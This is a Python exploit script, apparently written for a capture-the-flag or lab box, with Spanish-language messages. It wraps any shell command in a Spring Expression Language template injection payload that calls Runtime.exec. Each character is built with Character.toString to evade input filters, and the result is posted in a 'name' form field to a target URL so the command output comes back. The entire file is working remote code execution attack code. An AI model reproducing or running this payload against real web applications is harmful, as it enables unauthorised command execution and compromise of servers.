```
#!/bin/python3

import os, requests, sys, signal
from pwn import * #type: ignore

def def_handler(sig, frame):
    print('\n\n[!] Saliendo...\n')
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)


def ssti(command):
    payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)'%(ord(command[0]))
    command = command[1:]
    for char in command:
        char = ord(char)
        payload += '.concat(T(java.lang.Character).toString(%s))'%(char)
    payload += ').getInputStream())}'
    return(payload)


def make_req(payload, url):
    post_data = {
            'name': '%s'%(payload)}
    r = requests.post(url, data=post_data)
    print(r.text)


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print('[-] Usage: python3 %s {COMMAND} {URL}'%(sys.argv[0]))
        sys.exit(1)
    payload = ssti(sys.argv[1])
    make_req(payload, sys.argv[2])
```
